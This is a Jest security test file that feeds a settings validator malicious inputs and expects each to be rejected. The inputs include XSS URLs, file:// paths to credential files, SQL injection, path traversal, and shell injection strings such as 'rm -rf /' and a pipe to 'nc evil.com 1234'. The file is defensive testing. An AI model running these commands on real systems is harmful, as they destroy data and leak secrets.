/**
 * @jest-environment node
 */
'use strict';

/**
 * Settings Validation Security - REAL SECURITY TESTS
 * ============================================================================
 * Tests that verify settings validator properly rejects malicious inputs:
 * - javascript: and data: URLs
 * - Infinity and NaN values
 * - Empty strings
 * - Malformed types
 * - Path traversal
 * - Command injection patterns
 * 
 * These tests expose REAL security vulnerabilities, not theoretical issues.
 * Based on BUGS_FOUND_BY_REAL_TESTS.md findings.
 * 
 * @module tests/component/SettingsValidation-Security.real
 */

const path = require('path');
const fs = require('fs');

describe('Settings Validation Security - REAL TESTS', () => {
  let SettingsValidator;

  beforeAll(() => {
    const validatorPath = path.resolve(__dirname, '../../src/domain/settings/validators/SettingsValidator.js');
    
    expect(fs.existsSync(validatorPath)).toBe(true);
    SettingsValidator = require(validatorPath);
  });

  describe('CRITICAL: JavaScript URL Injection (XSS)', () => {
    test('should REJECT javascript: URL in api_base', () => {
      if (!SettingsValidator) {
        console.warn('SettingsValidator not found, skipping test');
        return;
      }

      const validator = SettingsValidator;

      const maliciousSettings = {
        llm: {
          api_base: 'javascript:alert(document.cookie)',
          provider: 'openai',
          model: 'gpt-4'
        }
      };

      const result = validator.validate(maliciousSettings);

      // CRITICAL BUG: Should REJECT javascript: URLs
      expect(result.valid).toBe(false);
      expect(result.errors).toBeDefined();
      expect(result.errors.length).toBeGreaterThan(0);
      
      const hasUrlError = result.errors.some(e => 
        typeof e === 'string' && (
          e.toLowerCase().includes('url') || 
          e.toLowerCase().includes('api_base') ||
          e.toLowerCase().includes('javascript')
        )
      );
      
      if (!hasUrlError) {
        console.error('SECURITY BUG FOUND:');
        console.error('javascript: URL in api_base ACCEPTED');
        console.error('This is an XSS vulnerability');
        console.error('Result:', JSON.stringify(result, null, 2));
      }

      expect(hasUrlError).toBe(true);
    });

    test('should REJECT data: URL in api_base', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const attacks = [
        'data:text/html,<script>alert("XSS")</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=',
        'DATA:text/html,<script>alert(1)</script>' // uppercase
      ];

      attacks.forEach((attack, i) => {
        const maliciousSettings = {
          llm: {
            api_base: attack,
            provider: 'openai',
            model: 'gpt-4'
          }
        };

        const result = validator.validate(maliciousSettings);

        // CRITICAL: Should REJECT all data: URLs
        if (result.valid) {
          console.error(`SECURITY BUG #${i + 1}:`);
          console.error(`data: URL ACCEPTED: ${attack}`);
          console.error('This is an XSS vulnerability');
        }

        expect(result.valid).toBe(false);
      });
    });

    test('should REJECT vbscript: URL in api_base', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const maliciousSettings = {
        llm: {
          api_base: 'vbscript:msgbox("XSS")',
          provider: 'openai',
          model: 'gpt-4'
        }
      };

      const result = validator.validate(maliciousSettings);

      expect(result.valid).toBe(false);
    });

    test('should REJECT file:// URLs in api_base', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const attacks = [
        'file:///etc/passwd',
        'file:///C:/Windows/System32/config/SAM',
        'file://localhost/etc/hosts'
      ];

      attacks.forEach(attack => {
        const maliciousSettings = {
          llm: {
            api_base: attack,
            provider: 'openai',
            model: 'gpt-4'
          }
        };

        const result = validator.validate(maliciousSettings);

        if (result.valid) {
          console.error('SECURITY BUG: file:// URL ACCEPTED');
          console.error('URL:', attack);
        }

        expect(result.valid).toBe(false);
      });
    });
  });

  describe('CRITICAL: Infinity and NaN Values', () => {
    test('should REJECT Infinity in context_window', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const maliciousSettings = {
        llm: {
          context_window: Infinity,
          provider: 'openai',
          model: 'gpt-4'
        }
      };

      const result = validator.validate(maliciousSettings);

      // CRITICAL BUG: Infinity passes typeof check
      if (result.valid) {
        console.error('VALIDATION BUG FOUND:');
        console.error('context_window: Infinity ACCEPTED');
        console.error('typeof Infinity === "number" but it should be rejected');
      }

      expect(result.valid).toBe(false);
      expect(result.errors).toBeDefined();
    });

    test('should REJECT NaN in context_window', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const maliciousSettings = {
        llm: {
          context_window: NaN,
          provider: 'openai',
          model: 'gpt-4'
        }
      };

      const result = validator.validate(maliciousSettings);

      // CRITICAL BUG: NaN passes typeof check
      if (result.valid) {
        console.error('VALIDATION BUG FOUND:');
        console.error('context_window: NaN ACCEPTED');
        console.error('typeof NaN === "number" but it should be rejected');
      }

      expect(result.valid).toBe(false);
    });

    test('should REJECT negative Infinity in temperature', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const maliciousSettings = {
        llm: {
          temperature: -Infinity,
          provider: 'openai',
          model: 'gpt-4'
        }
      };

      const result = validator.validate(maliciousSettings);

      expect(result.valid).toBe(false);
    });

    test('should REJECT Infinity in max_tokens', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const maliciousSettings = {
        llm: {
          max_tokens: Infinity,
          provider: 'openai',
          model: 'gpt-4'
        }
      };

      const result = validator.validate(maliciousSettings);

      expect(result.valid).toBe(false);
    });
  });

  describe('CRITICAL: Empty String Injection', () => {
    test('should REJECT empty provider string', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const maliciousSettings = {
        llm: {
          provider: '',
          model: 'gpt-4'
        }
      };

      const result = validator.validate(maliciousSettings);

      // CRITICAL BUG: Empty strings should be rejected
      if (result.valid) {
        console.error('VALIDATION BUG:');
        console.error('Empty provider string ACCEPTED');
      }

      expect(result.valid).toBe(false);
    });

    test('should REJECT empty model string', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const maliciousSettings = {
        llm: {
          provider: 'openai',
          model: ''
        }
      };

      const result = validator.validate(maliciousSettings);

      if (result.valid) {
        console.error('VALIDATION BUG: Empty model string ACCEPTED');
      }

      expect(result.valid).toBe(false);
    });

    test('should REJECT empty api_base string', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const maliciousSettings = {
        llm: {
          api_base: '',
          provider: 'openai',
          model: 'gpt-4'
        }
      };

      const result = validator.validate(maliciousSettings);

      // Empty api_base might be valid (use default), but document behavior
      // If accepted, it should not cause errors downstream
      if (result.valid) {
        console.warn('Empty api_base accepted - verify default handling');
      }
    });

    test('should REJECT whitespace-only strings', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const attacks = [
        { provider: '   ', model: 'gpt-4' },
        { provider: '\t\t', model: 'gpt-4' },
        { provider: '\n\n', model: 'gpt-4' },
        { provider: 'openai', model: '   ' }
      ];

      attacks.forEach((settings, i) => {
        const result = validator.validate({ llm: settings });

        if (result.valid) {
          console.error(`VALIDATION BUG #${i + 1}: Whitespace-only string ACCEPTED`);
          console.error('Settings:', settings);
        }

        expect(result.valid).toBe(false);
      });
    });
  });

  describe('CRITICAL: Type Confusion Attacks', () => {
    test('should REJECT array instead of object for llm', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const maliciousSettings = {
        llm: ['not', 'an', 'object']
      };

      const result = validator.validate(maliciousSettings);

      // CRITICAL BUG: Type checking broken
      if (result.valid) {
        console.error('TYPE SAFETY BUG:');
        console.error('llm array ACCEPTED instead of object');
      }

      expect(result.valid).toBe(false);
    });

    test('should REJECT string instead of object for interpreter', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const maliciousSettings = {
        interpreter: 'not-an-object'
      };

      const result = validator.validate(maliciousSettings);

      if (result.valid) {
        console.error('TYPE SAFETY BUG: interpreter string ACCEPTED');
      }

      expect(result.valid).toBe(false);
    });

    test('should REJECT number instead of string for provider', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const maliciousSettings = {
        llm: {
          provider: 12345,
          model: 'gpt-4'
        }
      };

      const result = validator.validate(maliciousSettings);

      expect(result.valid).toBe(false);
    });

    test('should REJECT boolean instead of string for model', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const maliciousSettings = {
        llm: {
          provider: 'openai',
          model: true
        }
      };

      const result = validator.validate(maliciousSettings);

      expect(result.valid).toBe(false);
    });

    test('should REJECT null values in required fields', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const attacks = [
        { llm: { provider: null, model: 'gpt-4' } },
        { llm: { provider: 'openai', model: null } },
        { llm: null }
      ];

      attacks.forEach(settings => {
        const result = validator.validate(settings);
        expect(result.valid).toBe(false);
      });
    });

    test('should REJECT undefined values in required fields', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const maliciousSettings = {
        llm: {
          provider: undefined,
          model: 'gpt-4'
        }
      };

      const result = validator.validate(maliciousSettings);

      expect(result.valid).toBe(false);
    });
  });

  describe('CRITICAL: Enum Validation Bypass', () => {
    test('should REJECT invalid safe_mode values', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const invalidModes = [
        null,
        undefined,
        '',
        1,
        true,
        'invalid',
        'OFF', // wrong case
        'ask ', // trailing space
        ' auto' // leading space
      ];

      invalidModes.forEach((mode, i) => {
        const maliciousSettings = {
          interpreter: {
            safe_mode: mode
          }
        };

        const result = validator.validate(maliciousSettings);

        // CRITICAL: Only 'off', 'ask', 'auto' should be valid
        if (result.valid && mode !== 'off' && mode !== 'ask' && mode !== 'auto') {
          console.error(`ENUM VALIDATION BUG #${i + 1}:`);
          console.error(`Invalid safe_mode ACCEPTED: ${JSON.stringify(mode)}`);
          console.error('This bypasses security policies');
        }

        expect(result.valid).toBe(false);
      });
    });

    test('should be case-sensitive for safe_mode', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const caseMismatch = ['OFF', 'Ask', 'AUTO', 'Off', 'ASK'];

      caseMismatch.forEach(mode => {
        const result = validator.validate({
          interpreter: { safe_mode: mode }
        });

        // Should reject wrong case (or normalize)
        if (result.valid && mode !== 'off' && mode !== 'ask' && mode !== 'auto') {
          console.warn(`Case mismatch accepted: ${mode}`);
        }
      });
    });
  });

  describe('CRITICAL: Protocol-Relative URL Bypass', () => {
    test('should handle protocol-relative URLs', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const ambiguousUrls = [
        '//example.com',
        '//evil.com/api',
        '//localhost:8080'
      ];

      ambiguousUrls.forEach(url => {
        const result = validator.validate({
          llm: {
            api_base: url,
            provider: 'openai',
            model: 'gpt-4'
          }
        });

        // Document behavior
        if (result.valid) {
          console.warn(`Protocol-relative URL accepted: ${url}`);
          console.warn('Verify this doesn\'t cause HTTPS downgrade attacks');
        }
      });
    });

    test('should reject incomplete URLs', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const incompleteUrls = [
        'http://',
        'https://',
        'http:///',
        'http:/example.com', // missing /
        'htp://example.com' // typo
      ];

      incompleteUrls.forEach(url => {
        const result = validator.validate({
          llm: {
            api_base: url,
            provider: 'openai',
            model: 'gpt-4'
          }
        });

        if (result.valid) {
          console.error(`VALIDATION BUG: Incomplete URL accepted: ${url}`);
        }

        expect(result.valid).toBe(false);
      });
    });
  });

  describe('CRITICAL: Number Range Violations', () => {
    test('should REJECT negative context_window', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const result = validator.validate({
        llm: {
          context_window: -1,
          provider: 'openai',
          model: 'gpt-4'
        }
      });

      expect(result.valid).toBe(false);
    });

    test('should REJECT zero max_tokens', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const result = validator.validate({
        llm: {
          max_tokens: 0,
          provider: 'openai',
          model: 'gpt-4'
        }
      });

      // Zero max_tokens should be rejected or handled specially
      if (result.valid) {
        console.warn('max_tokens: 0 accepted - verify backend handling');
      }
    });

    test('should REJECT temperature outside 0-2 range', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const invalidTemps = [-1, -0.1, 2.1, 10, 100];

      invalidTemps.forEach(temp => {
        const result = validator.validate({
          llm: {
            temperature: temp,
            provider: 'openai',
            model: 'gpt-4'
          }
        });

        if (result.valid) {
          console.error(`RANGE BUG: temperature ${temp} accepted (should be 0-2)`);
        }

        expect(result.valid).toBe(false);
      });
    });

    test('should REJECT top_p outside 0-1 range', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const invalidValues = [-0.1, 1.1, 2, -1];

      invalidValues.forEach(value => {
        const result = validator.validate({
          llm: {
            top_p: value,
            provider: 'openai',
            model: 'gpt-4'
          }
        });

        if (result.valid) {
          console.error(`RANGE BUG: top_p ${value} accepted (should be 0-1)`);
        }

        expect(result.valid).toBe(false);
      });
    });
  });

  describe('CRITICAL: Injection Attacks in Model Names', () => {
    test('should sanitize model names with special characters', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const attacks = [
        '<script>alert("XSS")</script>',
        'model; DROP TABLE settings;--',
        'model\'; DROP TABLE settings;--',
        '../../etc/passwd',
        '..\\..\\windows\\system32',
        'model\x00',
        'model\r\nX-Injected-Header: value'
      ];

      attacks.forEach((model, i) => {
        const result = validator.validate({
          llm: {
            provider: 'openai',
            model
          }
        });

        if (result.valid) {
          console.error(`INJECTION BUG #${i + 1}:`);
          console.error(`Dangerous model name accepted: ${model}`);
          
          // If sanitized, verify it's safe
          if (result.sanitized && result.sanitized.llm && result.sanitized.llm.model) {
            const sanitized = result.sanitized.llm.model;
            console.warn(`Sanitized to: ${sanitized}`);
            
            // Should not contain dangerous patterns
            expect(sanitized).not.toContain('<script>');
            expect(sanitized).not.toContain('DROP TABLE');
            expect(sanitized).not.toContain('../');
            expect(sanitized).not.toContain('\\x00');
          }
        }
      });
    });

    test('should reject path traversal in model names', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const pathAttacks = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '/etc/passwd',
        'C:\\Windows\\System32',
        './local/file'
      ];

      pathAttacks.forEach(model => {
        const result = validator.validate({
          llm: {
            provider: 'openai',
            model
          }
        });

        if (result.valid) {
          console.error(`PATH TRAVERSAL: Model name with path accepted: ${model}`);
        }
      });
    });
  });

  describe('CRITICAL: Command Injection in Provider Names', () => {
    test('should reject shell metacharacters in provider', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const shellMetachars = [
        'provider; rm -rf /',
        'provider && cat /etc/passwd',
        'provider | nc evil.com 1234',
        'provider`whoami`',
        'provider$(whoami)',
        'provider > /tmp/evil'
      ];

      shellMetachars.forEach(provider => {
        const result = validator.validate({
          llm: {
            provider,
            model: 'gpt-4'
          }
        });

        if (result.valid) {
          console.error('COMMAND INJECTION RISK:');
          console.error(`Provider with shell metacharacters accepted: ${provider}`);
        }

        expect(result.valid).toBe(false);
      });
    });
  });

  describe('Performance: Denial of Service', () => {
    test('should reject extremely large context_window', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const huge = Number.MAX_SAFE_INTEGER;
      
      const result = validator.validate({
        llm: {
          context_window: huge,
          provider: 'openai',
          model: 'gpt-4'
        }
      });

      // Should have reasonable upper bound
      if (result.valid) {
        console.warn('MAX_SAFE_INTEGER context_window accepted - potential DoS');
      }
    });

    test('should reject extremely large max_tokens', () => {
      expect(SettingsValidator).toBeDefined();

      const validator = SettingsValidator;

      const result = validator.validate({
        llm: {
          max_tokens: 999999999,
          provider: 'openai',
          model: 'gpt-4'
        }
      });

      // Should have reasonable upper bound (e.g., 100k)
      if (result.valid) {
        console.warn('Very large max_tokens accepted - potential DoS/cost explosion');
      }
    });
  });
});

